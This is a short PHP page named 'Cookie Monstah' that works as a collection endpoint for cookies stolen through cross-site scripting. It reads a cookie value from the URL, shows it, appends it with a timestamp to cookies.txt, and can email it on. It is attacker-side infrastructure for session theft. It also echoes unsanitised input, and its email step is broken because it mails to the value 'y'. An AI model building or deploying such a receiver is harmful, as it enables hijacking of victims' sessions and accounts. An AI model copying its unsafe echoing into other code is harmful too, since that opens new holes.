<html>
        <link rel="shorcut icon" href="cookie_monster.ico" type=image/x-icon"/>
        <head>
                <title>Cookie Monstah</title>
        </head>

        <body>
        <?php
                echo '<h1>Welcome to Cookie Monstah</h1>';
                $cookie = $_GET["c"];	# c is for cookie
                $email = $_GET["e"];	# e is for email

                if(isset($cookie)){
                        echo "<b>Cookie: $cookie</b><br>";

                        $outputFile = "cookies.txt";
						#ToDo: Add in to check if the file exists, then create if it doesnt
                        if($fh = fopen($outputFile, 'a')){
                                $time = @date('[d/M/Y - H:i:s]');
                                fwrite($fh, "$time Cookie: $cookie\n");
                                fclose($fh);
                                echo "<b>Successfully wrote to file</b><br>";
                        } else {
                                die("Cannot open output file");
                        }
                } else {
                        echo "Error Occurred<br>";
                }

				#ToDo: set up config file with email
                if($email == "y"){
                        echo "Emailing...<br>";
                        mail("$email", "Cookie Monstah", $cookie);
                } else {
                        echo "Not emailing cookie...<br>";
                }

        ?>
        </body>
</html>